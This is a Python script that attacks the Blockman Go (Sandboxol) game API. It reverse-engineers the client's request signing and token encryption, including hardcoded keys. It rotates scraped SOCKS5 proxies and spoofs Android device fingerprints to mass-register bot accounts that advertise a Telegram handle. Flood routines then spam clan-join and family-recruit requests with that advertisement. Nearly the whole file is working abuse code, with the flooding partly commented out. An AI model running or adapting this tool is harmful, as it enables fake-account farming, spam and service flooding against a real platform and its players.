import asyncio
import base64
import hashlib
import random
import uuid
import time
import re

import aiohttp
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from PyRoxy import ProxyChecker, ProxyUtiles
from aiohttp_socks import ProxyConnector

PROXY_WORK = []

def get_xsign(path, nonce, time, params, android_id):
    md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()

    if path in ENDPOINTS or (path.startswith("/config/files/") or path.startswith("/config/ml/files/")):
        return md5
    return hashlib.md5(f"{md5}{android_id}".encode()).hexdigest()

def get_enc_token(no_enc_token):
    data = pad(bytes(b ^ 0x73 for b in no_enc_token.encode()), 16)

    secret = hashlib.md5(b"9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s").hexdigest()

    cipher = AES.new(secret[:16].encode(), AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data)).decode()

def get_enc_query(android_id, nonce):
    key = RSA.import_key(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLzlsA+3wXCAph80r/xs1bWhVrsJSOQmSBTA0GaBpVIzXqFBaibDmYA3WJDM9rcQ7KpYSyrJ02iFlsN43RnizrHfS+xPtdwuxBQ2Clow5cYPZucqQYL9HIlbBLoighH2eGQqGlVadL7r384iKTz9mmckSUa8hhJzS+WwUAqVO3DwIDAQAB"))
    cipher = PKCS1_v1_5.new(key)
    query = f"0\n{android_id}\n{nonce}".encode()
    encrypted = b""
    for i in range(0, len(query), 117):
        chunk = query[i:i+117]
        encrypted += cipher.encrypt(chunk)
    return base64.b64encode(encrypted).decode()

def get_android_sign(android_id):
    xored_data = bytes(b ^ 0x73 for b in android_id.encode())
    padded_data = pad(xored_data, AES.block_size)

    cipher = AES.new(b"MFwwDQYJKoZIhvcN", AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(padded_data)

    return base64.b64encode(encrypted_bytes).decode()

DATA_CENTERS = []

async def cdn(session):
    async with session.get("https://pastebin.com/raw/JAUiZzvb") as response:
        ips_text = await response.text()

    ips = [ip.strip() for ip in ips_text.split(",") if ip.strip()]

    async def add_cdn(ip):
        async with session.get(f"https://dns.google/resolve?name=gw.sandboxol.com&type=A&edns_client_subnet={ip}") as response:
            payload = await response.json()
            return [
                answer["data"] for answer in payload.get("Answer", [])
                if answer.get("type") == 1 and "data" in answer
            ]

    while True:
        tasks = (add_cdn(ip) for ip in ips)
        results = await asyncio.gather(*tasks)

        unique_ips = {ip for sublist in results for ip in sublist}

        DATA_CENTERS[:] = sorted(list(unique_ips))
        print(f"DATA_CENTERS updated: {DATA_CENTERS}")

        await asyncio.sleep(6000000000000000000000)

async def proxies(session):
    while True:
        global PROXY_WORK

        prx = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/refs/heads/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",
            "https://raw.githubusercontent.com/zenjahid/FreeProxy4u/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/databay-labs/free-proxy-list/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/Skillter/ProxyGather/refs/heads/master/proxies/working-proxies-socks5.txt",
            "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/socks5.txt",
            "https://raw.githubusercontent.com/zebbern/Proxy-Scraper/refs/heads/main/socks5.txt"
        ]

        send = 0
        total = 0
        naxui = random.randint(1000, 9999)
        for url in prx:
            send += 1
            try:
                async with session.get(url, timeout=5) as response:
                    req = await response.text()
                req = re.sub(r"^\s+|\s+$", "", re.sub(r"^\s*$\n?", "", req, flags=re.MULTILINE), flags=re.MULTILINE).splitlines()

                if "socks5" in url:
                    req = ["socks5://" + prox.lstrip("socks5://") for prox in req]

                elif "socks4" in url:
                    req = ["socks4://" + prox.lstrip("socks4://") for prox in req]

                elif "https" in url:
                    req = ["https://" + prox.lstrip("https://") for prox in req]

                elif "http" in url:
                    req = ["http://" + prox.lstrip("http://") for prox in req]

                total += len(req)
                print(f"[{send}]", url, f"| {len(req)}")

                with open(f"bazadian{naxui}.txt", "a", encoding="utf-8") as f:
                    f.write("\n".join([re.sub(r"^(([^:]+:){2}[^:]+):.*$", r"\1", prox) for prox in req]) + "\n")
            except Exception as e:
                print(e)

        print(f"total {total}\n")

        proxies_list = ProxyUtiles.readFromFile(f"bazadian{naxui}.txt")

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, ProxyChecker.checkAll, proxies_list
        )
        print("all proxy checked")

        PROXY_WORK = [str(proxy) for proxy in result]

        print(f"Found {len(PROXY_WORK)} working proxies.")
        await asyncio.sleep(300)

async def update_endpoints(session):
    global ENDPOINTS

    async with session.get("https://pastebin.com/raw/zYLkEaLv") as response:
        ENDPOINTS = (await response.text()).split(",")

async def main():
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=0)
    ) as session:
        asyncio.create_task(update_endpoints(session))
        asyncio.create_task(cdn(session))
        asyncio.create_task(proxies(session))
        while True:
            if not PROXY_WORK:
                await asyncio.sleep(0.1)
                continue
            break
        lock = asyncio.Lock()
        asyncio.create_task(create_accounts(session, lock))
      #  await asyncio.sleep(15)
     #   asyncio.create_task(flood_s(session, lock))
        await asyncio.sleep(9999999999999999999999999999999999999999)

ACCOUNTS = []

async def cr(lock):
    while True:
        async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
            android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
            nonce = str(uuid.uuid4())
            query = get_enc_query(android_id, nonce)
            android_sign = get_android_sign(android_id)
            xtime = str(int(time.time()))
            xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
            try:
                async with session.get(
                    f"http://{random.choice(DATA_CENTERS)}/user/api/v5/account/auth-token",
                    timeout=5,
                    params={"q":query},
                    headers={
                        "bmg-user-id": "0",
                        "bmg-device-id": android_id,
                        "bmg-sign": android_sign,
                        "bmg-adid-sign": "98a580c5182455f00f732f48233928706925543c",
                        "package-name": "com.sandboxol.blockymods",
                        "userId": "0",
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": "ru",
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": "0",
                        "device_register_ts": "0",
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": "ru_RU",
                        "region": "",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "telecomOper": "unknown",
                        "manufacturer": "Redmi_Redmi Note 8 Pro",
                        "network": "wifi",
                        "brand": "Redmi",
                        "model": "Redmi Note 8 Pro",
                        "device": "begonia",
                        "deviceModel": "Redmi Note 8 Pro",
                        "board": "begonia",
                        "cpu": "CPU architecture: 8",
                        "cpuFrequency": "2012500",
                        "dpi": "2.75",
                        "screenHeight": "2220",
                        "screenWidth": "1080",
                        "ram_memory": "5635",
                        "rom_memory": "52438",
                        "open_id": "",
                        "open_id_type": "0",
                        "client_ip": "",
                        "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/user/api/v5/account/auth-token",
                        "Access-Token": "",
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.text())
                    if (await response.json())["code"] == 1:
                        answer = await response.json()
                        user_id = str(int(answer["data"]["userId"]))
                        token = answer["data"]["accessToken"]
                        register_time = str(int(answer["data"]["registerTime"]))
                        device_register_time = str(int(answer["data"]["deviceRegisterTime"]))
                        nickname = "kn_ew.tg_" + uuid.uuid4().hex[:11]
                        nonce = str(uuid.uuid4())
                        xtime = str(int(time.time()))
                        a = "{"
                        b = "}"
                        body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761081787482114.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                        xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                        async with session.post(
                            f"http://{random.choice(DATA_CENTERS)}/user/api/v1/user/register",
                            timeout=5,
                            data=body_string.encode(),
                            headers={
                                "bmg-device-id": android_id,
                                "userId": user_id,
                                "packageName": "official",
                                "packageNameFull": "com.sandboxol.blockymods",
                                "androidVersion": "30",
                                "OS": "android",
                                "appType": "android",
                                "appLanguage": "ru",
                                "appVersion": "5421",
                                "appVersionName": "2.125.1",
                                "channel": "sandbox",
                                "uid_register_ts": register_time,
                                "device_register_ts": device_register_time,
                                "eventType": "app",
                                "userDeviceId": android_id,
                                "userLanguage": "ru_RU",
                                "region": "RU",
                                "clientType": "client",
                                "env": "prd",
                                "package_name_en": "com.sandboxol.blockymods",
                                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                                "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "telecomOper": "unknown",
                                "manufacturer": "Redmi_Redmi Note 8 Pro",
                                "network": "wifi",
                                "brand": "Redmi",
                                "model": "Redmi Note 8 Pro",
                                "device": "begonia",
                                "deviceModel": "Redmi Note 8 Pro",
                                "board": "begonia",
                                "cpu": "CPU architecture: 8",
                                "cpuFrequency": "2012500",
                                "dpi": "2.75",
                                "screenHeight": "2220",
                                "screenWidth": "1080",
                                "ram_memory": "5635",
                                "rom_memory": "52438",
                                "open_id": "",
                                "open_id_type": "0",
                                "client_ip": "",
                                "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                                "X-Nonce": nonce,
                                "X-Time": xtime,
                                "X-Sign": xsign,
                                "X-UrlPath": "/user/api/v1/user/register",
                                "Access-Token": get_enc_token(token + nonce),
                                "Content-Type": "application/json; charset=UTF-8",
                                "Host": "gw.sandboxol.com",
                                "Connection": "Keep-Alive",
                                "Accept-Encoding": "gzip",
                                "User-Agent": "okhttp/4.10.0"
                            }
                        ) as response:
                            print(await response.text())
                            if (await response.json())["code"] == 1:
                                answer = await response.json()
                                token = answer["data"]["accessToken"]
                                register_time = str(int(answer["data"]["registerTime"]))
                                async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
            except Exception as e:
                print(e)
                await asyncio.sleep(5)

async def create_accounts(session, lock):
        tasks = [asyncio.create_task(cr(lock)) for _ in range(100)]
        await asyncio.gather(*tasks)

async def flood_s(session, lock):
    async def flood_k(session):
        while True:
            if not ACCOUNTS:
                continue
            account = random.choice(ACCOUNTS)
            user_id, token, android_id, register_time, device_register_time = account.split(":")
            nonce = str(uuid.uuid4())
            xtime = str(int(time.time()))
            xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
            region = random.choice(
                [
                    "zh_CN",
                    "en_US",
                    "de_DE",
                    "es_ES",
                    "fr_FR",
                    "hi_IN",
                    "in_ID",
                    "it_IT",
                    "ja_JP",
                    "ko_KR",
                    "pl_PL",
                    "pt_PT",
                    "ru_RU",
                    "th_TH",
                    "tr_TR",
                    "uk_UA",
                    "vi_VN"
                ]
            )
            try:
                async with session.delete(
                    f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                    timeout=2,
                    headers={
                        "userId": user_id,
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": region[:2],
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": register_time,
                        "device_register_ts": device_register_time,
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": region,
                        "region": "RU",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/friend/api/v1/family/recruit",
                        "Access-Token": get_enc_token(token + nonce),
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    pass

                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                a = "{"
                b = "}"
                aa = random.choice(["1", "2", "3", "4"])
                bb = random.choice(["1", "2", "3", "4"])
                body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
                async with session.post(
                    f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                    data=body_string.encode(),
                    timeout=2,
                    headers={
                        "language": region,
                        "userId": user_id,
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": region[:2],
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": register_time,
                        "device_register_ts": device_register_time,
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": region,
                        "region": "RU",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/friend/api/v1/family/recruit",
                        "Access-Token": get_enc_token(token + nonce),
                        "Content-Type": "application/json; charset=UTF-8",
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    pass
            except:
                continue

    tasks = [asyncio.create_task(flood_k(session)) for _ in range(100)]
    await asyncio.gather(*tasks)

async def clan_flood(session, clan_id, region):
    nonce = str(uuid.uuid4())
    xtime = str(int(time.time()))
    account = random.choice(ACCOUNTS)
    user_id, token, android_id, register_time, device_register_time = account.split(":")
    body_string = f'{{"clanId":{clan_id},"msg":"httрs://t.mе/kn_ew (in telegram @kn_ew)"}}'
    xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, body_string, android_id)
    try:
        async with session.post(
            f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
            timeout=2,
            data=body_string,
            headers={
                "language": region,
                "userId": user_id,
                "packageName": "official",
                "packageNameFull": "com.sandboxol.blockymods",
                "androidVersion": "30",
                "OS": "android",
                "appType": "android",
                "appLanguage": region[:2],
                "appVersion": "5421",
                "appVersionName": "2.125.1",
                "channel": "sandbox",
                "uid_register_ts": register_time,
                "device_register_ts": device_register_time,
                "eventType": "app",
                "userDeviceId": android_id,
                "userLanguage": region,
                "region": "RU",
                "clientType": "client",
                "env": "prd",
                "package_name_en": "com.sandboxol.blockymods",
                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                "X-Nonce": nonce,
                "X-Time": xtime,
                "X-Sign": xsign,
                "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                "Access-Token": get_enc_token(token + nonce),
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "gw.sandboxol.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            }
        ) as response:
            print(await response.json())
            if (await response.json())[code] == 1:
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, "", android_id)
                async with session.get(
                    f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
                    timeout=2,
                    headers={
                        "language": region,
                        "userId": user_id,
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": region[:2],
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": register_time,
                        "device_register_ts": device_register_time,
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": region,
                        "region": "RU",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                        "Access-Token": get_enc_token(token + nonce),
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.json())
    except Exception as e:
        print(e)
        return

async def clan_parsing(session):
    while True:
        nonce = str(uuid.uuid4())
        xtime = str(int(time.time()))
        account = random.choice(ACCOUNTS)
        user_id, token, android_id, register_time, device_register_time = account.split(":")
        xsign = get_xsign("/clan/api/v1/clan/tribe/recommendation", nonce, xtime, "", android_id)
        region = random.choice(
            [
                "zh_CN",
                "en_US",
                "de_DE",
                "es_ES",
                "fr_FR",
                "hi_IN",
                "in_ID",
                "it_IT",
                "ja_JP",
                "ko_KR",
                "pl_PL",
                "pt_PT",
                "ru_RU",
                "th_TH",
                "tr_TR",
                "uk_UA",
                "vi_VN"
            ]
        )
        try:
            async with session.get(
                f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/recommendation",
                timeout=2,
                headers={
                    "language": region,
                    "userId": user_id,
                    "packageName": "official",
                    "packageNameFull": "com.sandboxol.blockymods",
                    "androidVersion": "30",
                    "OS": "android",
                    "appType": "android",
                    "appLanguage": region[:2],
                    "appVersion": "5421",
                    "appVersionName": "2.125.1",
                    "channel": "sandbox",
                    "uid_register_ts": register_time,
                    "device_register_ts": device_register_time,
                    "eventType": "app",
                    "userDeviceId": android_id,
                    "userLanguage": region,
                    "region": "RU",
                    "clientType": "client",
                    "env": "prd",
                    "package_name_en": "com.sandboxol.blockymods",
                    "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                    "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                    "X-Nonce": nonce,
                    "X-Time": xtime,
                    "X-Sign": xsign,
                    "X-UrlPath": "/clan/api/v1/clan/tribe/recommendation",
                    "Access-Token": get_enc_token(token + nonce),
                    "Host": "gw.sandboxol.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "User-Agent": "okhttp/4.10.0"
                }
            ) as response:
                data = await response.json()
                clan_ids = [
                    clan["clanId"]
                    for clan in data["data"]
                    if clan["currentCount"] < clan["maxCount"]
                ]
                if not clan_ids:
                    continue
                await clan_flood(session, random.choice(clan_ids), region)
        except:
            continue

asyncio.run(main())
